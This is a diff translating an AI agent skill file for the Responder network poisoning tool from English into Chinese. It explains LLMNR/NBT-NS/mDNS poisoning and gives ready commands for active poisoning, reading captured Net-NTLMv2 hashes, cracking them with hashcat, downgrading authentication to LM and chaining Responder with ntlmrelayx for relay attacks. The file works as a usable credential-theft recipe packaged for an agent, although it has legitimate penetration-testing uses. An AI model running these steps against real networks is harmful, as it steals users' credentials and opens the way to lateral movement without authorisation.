@@ -1,93 +1,86 @@
 ---
 name: responder
 description: >
-  This skill should be used when the user asks about "responder", "capture
-  NTLM hashes", "poison name resolution", "perform NTLM relay attacks", "set
-  up a rogue SMB/HTTP server for credential capture", "collect hashes for
-  offline cracking". NBT-NS, LLMNR, and mDNS poisoner that captures Net-NTLMv2
-  hashes from Windows hosts on the local network.
+  此技能适用于用户询问关于 "responder"、"捕获 NTLM 哈希"、"毒化名称解析"、"执行 NTLM 中继攻击"、"搭建流氓 SMB/HTTP 服务器进行凭据捕获"、"收集哈希用于离线破解" 等内容。NBT-NS、LLMNR 和 mDNS 毒化工具，可从局域网 Windows 主机捕获 Net-NTLMv2 哈希。
 ---
 
 # Responder
 
-LLMNR/NBT-NS/mDNS poisoner — captures Net-NTLMv2 hashes from Windows hosts on local network.
+LLMNR/NBT-NS/mDNS 毒化工具 —— 从局域网 Windows 主机捕获 Net-NTLMv2 哈希。
 
-## Concept
+## 原理
 
-When a Windows host tries to resolve a hostname that DNS cannot answer, it falls back to LLMNR/NBT-NS broadcast. Responder answers those broadcasts with its own IP, causing the Windows host to authenticate — Responder captures the Net-NTLMv2 hash.
+当 Windows 主机尝试解析 DNS 无法响应的主机名时，会回退到 LLMNR/NBT-NS 广播。Responder 响应这些广播并以自身 IP 回复，导致 Windows 主机发起认证 —— Responder 从中捕获 Net-NTLMv2 哈希。
 
-## Quick Start
+## 快速开始
 
 ```bash
-# Start passively (analyze mode — no poisoning)
+# 被动启动（分析模式 —— 不进行毒化）
 sudo responder -I eth0 -A
 
-# Active poisoning (captures hashes)
+# 主动毒化（捕获哈希）
 sudo responder -I eth0 -wv
 
-# Captured hashes saved to:
-# /usr/share/responder/logs/ or ~/.responder/logs/
+# 捕获的哈希保存至：
+# /usr/share/responder/logs/ 或 ~/.responder/logs/
 ```
 
-## Core Flags
+## 核心参数
 
-| Flag | Description |
-|------|-------------|
-| `-I <iface>` | Network interface |
-| `-A` | Analyze mode — no poisoning |
-| `-w` | Enable WPAD rogue proxy server |
-| `-d` | Enable DHCP poisoning |
-| `-b` | Enable Basic HTTP auth capture |
-| `-v` | Verbose (show each request) |
-| `-f` | Fingerprint hosts |
-| `--lm` | Downgrade auth to LM (legacy) |
-| `--disable-ess` | Disable extended session security |
-| `--lm` | Force LM hashing |
-| `-r` | Enable WINS server |
-| `--no-multirelay` | Disable relay mode |
+| 参数 | 说明 |
+|------|------|
+| `-I <iface>` | 网络接口 |
+| `-A` | 分析模式 —— 不进行毒化 |
+| `-w` | 启用 WPAD 流氓代理服务器 |
+| `-d` | 启用 DHCP 毒化 |
+| `-b` | 启用 Basic HTTP 认证捕获 |
+| `-v` | 详细输出（显示每个请求） |
+| `-f` | 指纹识别主机 |
+| `--lm` | 降级认证为 LM（旧版） |
+| `--disable-ess` | 禁用扩展会话安全 |
+| `-r` | 启用 WINS 服务器 |
+| `--no-multirelay` | 禁用中继模式 |
 
-## Rogue Servers Enabled by Default
+## 默认启用的流氓服务器
 
-`SMB`, `HTTP`, `HTTPS`, `FTP`, `DNS`, `LDAP`, `MSSQL`, `NTLMv1`, `NTLMv2`
+`SMB`、`HTTP`、`HTTPS`、`FTP`、`DNS`、`LDAP`、`MSSQL`、`NTLMv1`、`NTLMv2`
 
-## Common Workflows
+## 常用工作流程
 
 ```bash
-# Passive capture — wait for Windows hosts to broadcast
+# 被动捕获 —— 等待 Windows 主机广播
 sudo responder -I eth0 -wv
 
-# View captured hashes in real-time
+# 实时查看捕获的哈希
 tail -f /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
 
-# Crack captured hashes
+# 破解捕获的哈希
 hashcat -a 0 -m 5600 hashes.txt rockyou.txt
 
-# Disable SMB + HTTP for relay (if using ntlmrelayx in parallel)
-# Edit /etc/responder/Responder.conf:
+# 中继时禁用 SMB + HTTP（与 ntlmrelayx 并行使用）
+# 编辑 /etc/responder/Responder.conf：
 # SMB = Off
 # HTTP = Off
 sudo responder -I eth0 -wv
 
-# Combined relay attack:
-# Terminal 1: ntlmrelayx
+# 组合中继攻击：
+# 终端 1：ntlmrelayx
 ntlmrelayx.py -tf targets.txt -smb2support
 
-# Terminal 2: Responder (SMB+HTTP off)
+# 终端 2：Responder（SMB+HTTP 已关闭）
 sudo responder -I eth0 -wv
 ```
 
-## Captured Hash Format
+## 捕获的哈希格式
 
 ```
 [SMB] NTLMv2 Hash    : DOMAIN\user::DOMAIN:challenge:hash:blob
 ```
 
-Crack with hashcat mode `5600` (Net-NTLMv2) or pass via relay.
+使用 hashcat 模式 `5600`（Net-NTLMv2）破解，或通过中继传递。
 
-## Resources
+## 资源
 
-| File | When to load |
-|------|--------------|
-| `references/ntlm-relay.md` | Full relay chain: ntlmrelayx setup, LDAP relay, SMB signing bypass, RBCD |
-
-## Structuring This Skill
+| 文件 | 加载时机 |
+|------|----------|
+| `references/ntlm-relay.md` | 完整中继链：ntlmrelayx 配置、LDAP 中继、SMB 签名绕过、RBCD |
